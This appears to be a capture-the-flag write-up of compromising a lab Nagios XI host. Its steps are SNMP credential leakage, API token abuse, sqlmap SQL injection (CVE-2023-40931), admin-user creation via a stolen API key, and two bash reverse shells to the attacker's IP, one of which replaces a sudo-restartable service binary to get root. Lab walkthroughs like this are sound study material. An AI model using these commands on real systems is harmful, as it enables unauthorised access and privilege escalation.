## Intro

tags: #linux #WebApp #SNMP #OSCPpath #SQL-injection #codereview #unknown-binary #medium 

---
## Logging

```
mkdir monitored
cd monitored
```

- logs only current terminal
- type `exit` or press `Ctrl+D` to stop and save the file
- - to stop and save the file. You can replay it later using [scriptreplay](https://www.keuperict.nl/posts/security/2019/11/20/logging-terminal-session/)
```
script -t=timing.log monitored.log
```
ctrl+d should show this output:
```shell
exit
Script done.
```
now replay it as video on your terminal
```shell
scriptreplay -t timing.log monitored.log
```
if sth strange happens and did not happen to execute ctrl+d then
```shell
echo $SCRIPT
```
- If it outputs a path to a file (like `/home/kali/typescript`), **you are still recording**.
- If it returns a blank line, **you are not recording**.
- even if i close terminal the output will be saved

-> clean log for reporting, its now plaintext as shown on terminal
```shell
sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" bashed.log > monitored_report.txt
```

-----
# Reconnaissance

```shell
source basher target1 10.129.230.96 [IP]
source basher host1 monitored.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-06 08:52 -0400
Nmap scan report for 10.129.230.96
Host is up (0.055s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.19 second
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80,389,443,5667 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-06 08:53 -0400
Nmap scan report for monitored.htb (10.129.230.96)
Host is up (0.047s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_http-title: Nagios XI
5667/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   46.02 ms 10.10.14.1
2   46.88 ms monitored.htb (10.129.230.96)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.47 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-06 09:01 -0400
Warning: 10.129.230.96 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.230.96
Host is up (0.056s latency).
Not shown: 65383 open|filtered udp ports (no-response), 150 closed udp ports (port-unreach)
PORT    STATE SERVICE
123/udp open  ntp
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 144.86 seconds
```
interesting, snmp is open here

## WebApp

![](MediaFiles/Pasted%20image%2020260906155445.png)
the button goes to nagios login page
![](MediaFiles/Pasted%20image%2020260906155502.png)
added nagios.monitored.htb also to etc/hosts

default creds did not work

## LDAP enumeration

so  tried LDAP next since its open:
```shell
└─$ ldapsearch -x -H ldap://monitored.htb -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: dc=monitored,dc=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

└─$ ldapsearch -x -H ldap://monitored.htb -b "dc=monitored,dc=htb"
# extended LDIF
#
# LDAPv3
# base <dc=monitored,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# monitored.htb
dn: dc=monitored,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: monitored.htb
dc: monitored

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```
but we dont have valid creds, so we cant move forward

## SNMP enumeration

```shell
snmp-check 10.129.230.96
```
found this snippet, containing creds
```shell
  631                   runnable              sh                    /bin/sh               -c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
```
#### creds obtained
```shell
svc
XjH7VCehowpR1xZB
```

lets try these creds on the nagios login page
![](MediaFiles/Pasted%20image%2020260906160913.png)

now lets try with random creds
![](MediaFiles/Pasted%20image%2020260906160858.png)
hm we are getting different error message with the found creds! 


The documentation of the Nagios API is incredibly limited. [This PDF document](https://assets.nagios.com/downloads/nagiosxi/docs/Automated_Host_Management.pdf) give some overview of what it looks like, but not much. One thing I can get from that document is that the API like likely located at `/nagiosxi/api/v1`, and that I need an API key as a GET parameter:

## Searching for API endopoint

```shell
feroxbuster -u https://nagios.monitored.htb/nagiosxi/api/ -m GET,POST -k
```

```shell
                                                                                                                                                                                                                                                                                         
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://nagios.monitored.htb/nagiosxi/api
 🚩  In-Scope Url          │ nagios.monitored.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET, POST]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      283c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      286c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404     POST        9l       31w      283c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403     POST        9l       28w      286c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      337c https://nagios.monitored.htb/nagiosxi/api => https://nagios.monitored.htb/nagiosxi/api/
301      GET        9l       28w      346c https://nagios.monitored.htb/nagiosxi/api/includes => https://nagios.monitored.htb/nagiosxi/api/includes/
301     POST        9l       28w      337c https://nagios.monitored.htb/nagiosxi/api => https://nagios.monitored.htb/nagiosxi/api/
301     POST        9l       28w      346c https://nagios.monitored.htb/nagiosxi/api/includes => https://nagios.monitored.htb/nagiosxi/api/includes/
301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/api/v1 => https://nagios.monitored.htb/nagiosxi/api/v1/
301     POST        9l       28w      340c https://nagios.monitored.htb/nagiosxi/api/v1 => https://nagios.monitored.htb/nagiosxi/api/v1/
200      GET        1l        4w       32c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200     POST        1l        4w       32c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/license
200     POST        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/license
[###########>--------] - 2m    101274/180024  5m      found:8       errors:34158  
🚨 Caught ctrl+c 🚨 saving scan state to ferox-https_nagios_monitored_htb_nagiosxi_api-1788700592.state ...
[###########>--------] - 2m    101277/180024  5m      found:8       errors:34158  
[####################] - 2m     60000/60000   574/s   https://nagios.monitored.htb/nagiosxi/api/ 
[####################] - 2m     60000/60000   555/s   https://nagios.monitored.htb/nagiosxi/api/includes/ 
[####>---------------] - 2m     14880/60000   119/s   https://nagios.monitored.htb/nagiosxi/api/v1/ 
```
found `https://nagios.monitored.htb/nagiosxi/api/v1/`
![](MediaFiles/Pasted%20image%2020260906161645.png)

lets enumerate further
```shell
feroxbuster -eknr -u http://monitored.htb/nagiosxi/api/v1/
```

```shell
└─$ feroxbuster -eknr -u http://monitored.htb/nagiosxi/api/v1/                                                                                                        
                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://monitored.htb/nagiosxi/api/v1
 🚩  In-Scope Url          │ monitored.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        4w       32c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        3w       34c http://monitored.htb/nagiosxi/api/v1/license
403      GET        9l       28w      278c http://monitored.htb/nagiosxi/api/v1/Reports%20List
403      GET        9l       28w      278c http://monitored.htb/nagiosxi/api/v1/external%20files
403      GET        9l       28w      278c http://monitored.htb/nagiosxi/api/v1/Style%20Library
403      GET        9l       28w      278c http://monitored.htb/nagiosxi/api/v1/modern%20mom
403      GET        9l       28w      278c http://monitored.htb/nagiosxi/api/v1/neuf%20giga%20photo
403      GET        9l       28w      278c http://monitored.htb/nagiosxi/api/v1/Web%20References
200      GET        1l        7w       53c http://monitored.htb/nagiosxi/api/v1/authenticate
403      GET        9l       28w      278c http://monitored.htb/nagiosxi/api/v1/My%20Project
[#######>------------] - 6m     11366/30000   9m      found:9       errors:800    
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_monitored_htb_nagiosxi_api_v1-1788700991.state ...
[#######>------------] - 6m     11367/30000   9m      found:9       errors:800    
[#######>------------] - 6m     11359/30000   34/s    http://monitored.htb/nagiosxi/api/v1/ 
```
found an endpoint that seems to be usefull since we have creds: `http://monitored.htb/nagiosxi/api/v1/authenticate`

### Found authentication related api endpoint
to this API endpoint. I used this Google search query:
```
"nagios xi" "api" "curl" "authenticate"
```
https://support.nagios.com/forum/viewtopic.php?p=310411&ref=benheater.com#p310411

#### Login with found creds
```bash
curl -skL -X POST 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5000'
```

```shell
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "280734d8f4513591c21d28f46cd2d7782ab005c6",
    "valid_min": 5000,
    "valid_until": "Wed, 09 Sep 2026 20:48:47 -0400"
}
```
great! we got a token, now lets login
#### Got token
```
https://nagios.monitored.htb/nagiosxi/login.php?token=6a67fd28e5e423d7499ae66976486458064782ba
```
we are in!

## Login to Nagios 

![](MediaFiles/Pasted%20image%2020260906163447.png)
but this is not admin... lets see if we can find any vulnerabilities for this nagios version

### Vulnerable version

found: https://nvd.nist.gov/vuln/detail/CVE-2023-40931
allows authenticated attackers to execute arbitrary SQL commands via the ID parameter in the POST request to /nagiosxi/admin/banner_message-ajaxhelper.php.

used sqlmap for it
```shell
sqlmap -r req.txt -batch -dump  
  
(...)  
[11:18:35] [INFO] retrieved: 'IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL'  
[11:18:35] [INFO] retrieved: 'IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0'  
[11:18:36] [INFO] retrieved: '0'  
[11:18:36] [INFO] retrieved: '0'  
[11:18:36] [INFO] retrieved: 'admin@monitored.htb'  
(...)
```
#### api key obtained
```
IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
```

```shell
git clone https://github.com/Hamibubu/CVE-2023-48084
cd CVE-2023-48084

python3 exploit.py --target https://nagios.monitored.htb/nagiosxi --username svc --password XjH7VCehowpR1xZB
```

now lets create a new user
```shell
curl -XPOST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=ch3ckm8&password=passs&name=username&email=username@localhost&auth_level=admin"

{
    "success": "User account ch3ckm8 was added successfully!",
    "user_id": 7
}
```
logged in, changed passs to passss

### Admin login on Nagios
we are now in as admin
![](MediaFiles/Pasted%20image%2020260906170918.png)
#### Execute revshell via command line
**Configure > Core Config Manager > Commands**
```shell
bash -c 'bash -i >& /dev/tcp/10.10.14.247/3333 0>&1'
```
![](MediaFiles/Pasted%20image%2020260906171005.png)
Then, navigate to **Configure > Core Config Manager > Hosts**, click on **localhost**, select our **shell** command, and click on **Run Check Command**
![](MediaFiles/Pasted%20image%2020260906171100.png)
got shell back

## Shell as nagios

grab user flag
```shell
└─$ nc -lvnp 3333                                                                                                                              
listening on [any] 3333 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.230.96] 57082
bash: cannot set terminal process group (7613): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:~$ whoami
whoami
nagios
nagios@monitored:~$ 
nagios@monitored:~$ cat user.txt
cat user.txt
a92064a130610d9e590570d3c2cf99eb
```

------
# Privesc

## Sudo -l

```shell
nagios@monitored:~$ id 
id
uid=1001(nagios) gid=1001(nagios) groups=1001(nagios),1002(nagcmd)
nagios@monitored:~$ sudo -l
sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *

```
we can run multiple scripts here

## Custom script
### Overwriting service

searching them, i found that `manage_service.sh`
```bash
#!/bin/bash
#
# Manage Services (start/stop/restart)
# Copyright (c) 2015-2020 Nagios Enterprises, LLC. All rights reserved.
#
# =====================
# Built to allow start/stop/restart of services using the proper method based on
# the actual version of operating system.
#
# Examples:
# ./manage_services.sh start httpd
# ./manage_services.sh restart mysqld
# ./manage_services.sh checkconfig nagios
#

BASEDIR=$(dirname $(readlink -f $0))

# Import xi-sys.cfg config vars
. $BASEDIR/../etc/xi-sys.cfg

# Things you can do
first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")
second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")

# Helper functions
# -----------------------

contains () {
    local array="$1[@]"
    local seeking=$2
    local in=1
    for element in "${!array}"; do
        if [[ "$element" == "$seeking" ]]; then
            in=0
            break
        fi
    done
    return $in
}

# Verify to avoid abuse
# -----------------------

# Check to verify the proper usage format
# ($1 = action, $2 = service name)

if ! contains first "$1"; then
    echo "First parameter must be one of: ${first[*]}"
    exit 1
fi

if ! contains second "$2"; then
    echo "Second parameter must be one of: ${second[*]}"
    exit 1
fi

action=$1

# if service name is defined in xi-sys.cfg use that name
# else use name passed
if [ "$2" != "php-fpm" ] && [ ! -z "${!2}" ];then
    service=${!2}
else
    service=$2
fi

# if the action is status, add -n 0 to args to stop journal output
# on CentOS/RHEL 7 systems
args=""
if [ "$action" == "status" ]; then
    args="-n 0"
fi

# Special case for ndo2db since we don't use it anymore
if [ "$service" == "ndo2db" ]; then
    echo "OK - Nagios XI 5.7 uses NDO3 build in and no longer uses the ndo2db service"
    exit 0
fi

# Run the command
# -----------------------

# CentOS / Red Hat

if [ "$distro" == "CentOS" ] || [ "$distro" == "RedHatEnterpriseServer" ] || [ "$distro" == "EnterpriseEnterpriseServer" ] || [ "$distro" == "OracleServer" ]; then
    # Check for enable/disable verb
    if [ "$action" == "enable" ] || [ "$action" == "disable" ]; then
        if [ `command -v systemctl` ]; then
            `which systemctl` --no-pager "$action" "$service"
        elif [ `command -v chkconfig` ]; then
            chkconfig_path=`which chkconfig`
            if [ "$action" == "enable" ]; then
                "$chkconfig_path" --add "$service"
                return_code=$?
            elif [ "$action" == "disable" ]; then
                "$chkconfig_path" --del "$service"
                return_code=$?
            fi
        fi

        exit $return_code
    fi

    if [ `command -v systemctl` ]; then
        `which systemctl` --no-pager "$action" "$service" $args
        return_code=$?
        if [ "$service" == "mysqld" ] && [ $return_code -ne 0 ]; then
            service="mariadb"
            `which systemctl` "$action" "$service" $args
            return_code=$?
        fi
    elif [ ! `command -v service` ]; then
        "/etc/init.d/$service" "$action"
        return_code=$?
    else
        `which service` "$service" "$action"
        return_code=$?
    fi
fi

# OpenSUSE / SUSE Enterprise

if [ "$distro" == "SUSE LINUX" ]; then
    if [ "$dist" == "suse11" ]; then
        `which service` "$service" "$action"
        return_code=$?
    fi
fi


# Ubuntu / Debian

if [ "$distro" == "Debian" ] || [ "$distro" == "Ubuntu" ]; then
    # Adjust the shellinabox service, no trailing 'd' in Debian/Ubuntu
    if [ "$service" == "shellinaboxd" ]; then
        service="shellinabox"
    fi

    if [ `command -v systemctl` ]; then
        `which systemctl` --no-pager "$action" "$service" $args
        return_code=$?
    else
        `which service` "$service" "$action"
        return_code=$?
    fi
fi

# Others?

exit $return_code
```
in this snippet it shows what commmands we can run
```shell
# Things you can do
first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")

second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")
```
lets place a revshell inside nagios file at `/usr/local/nagios/bin`
```shell
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.247/5555 0>&1' > nagios
```
next:
```shell
nagios@monitored:/usr/local/nagios/bin$ mv nagios nagios.backup
```
lastly, restart nagios service:
```shell
sudo /usr/local/nagiosxi/scripts/manage_services.sh stop nagios

sudo /usr/local/nagiosxi/scripts/manage_services.sh start nagios
```
got shell
## Shell as root
```shell
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.230.96] 42922
bash: cannot set terminal process group (8251): Inappropriate ioctl for device
bash: no job control in this shell
root@monitored:/# whoami
whoami
root
root@monitored:/# cat root.txt  
cat root.txt
cat: root.txt: No such file or directory
root@monitored:/# ls

root@monitored:/# cd root
cd root    
root@monitored:/root# ls                               
ls
root.txt
root@monitored:/root# cat root.txt
cat root.txt
bff4af159888d75359a023d88b29c811
root@monitored:/root# id
id
uid=0(root) gid=0(root) groups=0(root)
```